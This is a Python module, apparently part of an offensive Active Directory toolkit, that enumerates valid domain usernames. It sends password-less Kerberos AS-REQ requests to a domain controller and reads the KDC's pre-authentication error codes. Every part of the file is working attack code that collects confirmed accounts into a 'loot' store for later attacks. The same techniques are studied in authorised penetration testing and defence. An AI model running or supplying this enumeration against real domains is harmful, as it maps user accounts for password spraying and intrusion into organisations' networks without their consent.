from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from impacket.krb5.kerberosv5 import KerberosError


class Enumerator:
    """Énumération d'utilisateurs valides via Kerberos pre-auth.
    Technique : on envoie un AS-REQ. Le KDC répond différemment
    selon que l'user existe ou non (KDC_ERR_C_PRINCIPAL_UNKNOWN
    vs KDC_ERR_PREAUTH_REQUIRED)."""

    def __init__(self, loot):
        self.loot = loot

    def enum_users(self, userlist_path):
        """Teste une liste d'users contre le KDC."""
        from pathlib import Path
        path = Path(userlist_path)
        if not path.exists():
            print(f"[!] Userlist introuvable: {path}")
            return

        with open(path, "r") as fh:
            candidates = [l.strip() for l in fh if l.strip()]

        print(f"[*] Énumération de {len(candidates)} users via Kerberos...")
        for user in candidates:
            if self._user_exists(user):
                self.loot.add_user(user)
                print(f"[+] User valide: {user}")

    def _user_exists(self, user):
        try:
            principal = Principal(
                user, type=constants.PrincipalNameType.NT_PRINCIPAL.value
            )
            # Pas de mot de passe -> on déclenche la réponse du KDC
            getKerberosTGT(
                principal, "", self.loot.domain,
                None, None, None, kdcHost=self.loot.dc_ip,
            )
            return True
        except KerberosError as e:
            err = e.getErrorCode()
            # PREAUTH_REQUIRED = l'user existe (mais demande un mot de passe)
            if err == constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
                return True
            # C_PRINCIPAL_UNKNOWN = l'user n'existe pas
            return False
        except Exception:
            return False
